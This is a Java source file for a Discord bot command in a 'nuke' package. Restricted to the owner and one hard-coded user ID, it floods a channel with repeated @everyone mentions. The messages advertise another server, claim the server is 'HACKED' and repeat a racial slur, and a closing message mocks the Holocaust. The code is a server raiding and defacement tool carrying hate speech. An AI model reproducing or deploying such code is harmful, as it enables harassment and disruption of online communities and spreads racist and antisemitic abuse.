package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.Arrays;
import java.util.List;

public class SpamEveryoneCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("210956619788320768")) {
            return;
        }
        boolean running = true;
        try {
            int input = Integer.parseInt(args.get(0));
            for (int i = 0; i != input; i++) {
                if (running) {
                    event.getChannel().sendMessage("MOVING SERVERS ! ! ! ILY SWAG  https://discord.gg/failures    " +"  @everyone HACKED BY swag L L L NIGGA @everyone    " +"  @everyone HACKED BY swag L L L NIGGA @everyone    " +"\n  @everyone HACKED BY swag L L L NIGGA @everyone    " + "  @everyone HACKED BY swag L L L NIGGA @everyone    "+"  @everyone HACKED BY swag L L L NIGGA @everyone    "+"\n  @everyone HACKED BY swag L L L NIGGA @everyone    " + "  @everyone HACKED BY swag L L L NIGGA @everyone    "+"  @everyone HACKED BY swag L L L NIGGA @everyone    "+"\n  @everyone HACKED BY swag L L L NIGGA @everyone    " + "  @everyone HACKED BY swag L L L NIGGA @everyone    "+"  @everyone HACKED BY swag L L L NIGGA @everyone    " +"\n  @everyone HACKED BY swag L L L NIGGA @everyone    " + "  @everyone HACKED BY swag L L L NIGGA @everyone    "+"  @everyone HACKED BY swag L L L NIGGA @everyone    "+"\n  @everyone HACKED BY swag L L L NIGGA @everyone    " + "  @everyone HACKED BY swag L L L NIGGA @everyone    "+"  @everyone HACKED BY swag L L L NIGGA @everyone    "+"\n  @everyone HACKED BY swag L L L NIGGA @everyone    " + "  @everyone HACKED BY swag L L L NIGGA @everyone    "+"  @everyone HACKED BY swag L L L NIGGA @everyone    "+"\n  @everyone HACKED BY swag L L L NIGGA @everyone    " + "  @everyone HACKED BY swag L L L NIGGA @everyone    "+"  @everyone HACKED BY swag L L L NIGGA @everyone    "+"\n  @everyone HACKED BY swag L L L NIGGA @everyone    " + "  @everyone HACKED BY swag L L L NIGGA @everyone    "+"  @everyone HACKED BY swag L L L NIGGA @everyone    "+"\n  @everyone HACKED BY swag L L L NIGGA @everyone    " + "  @everyone HACKED BY swag L L L NIGGA @everyone    "+"  @everyone HACKED BY swag L L L NIGGA @everyone    ").queue();
                    Thread.sleep(600);
                }
                if (i == input - 1) {
                    running = false;
                    event.getChannel().sendMessage("ðŸŽ‰ðŸŽ‰@everyone the holocoust v2 has been stopped ðŸ˜�ðŸ¤žðŸ˜‰ðŸ‘�ðŸ¤£").queue();
                }
            }

        } catch (NumberFormatException | InterruptedException | ArrayIndexOutOfBoundsException ex) {

        }
    }

    @Override
    public String getHelp() {
        return "Spams mentions everyone lol.\n`" + Core.PREFIX + getInvoke() + "` [amount]\nAlises: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "idk";
    }

    @Override
    public String[] getAlias() {
        return new String[0];
    }

     @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}
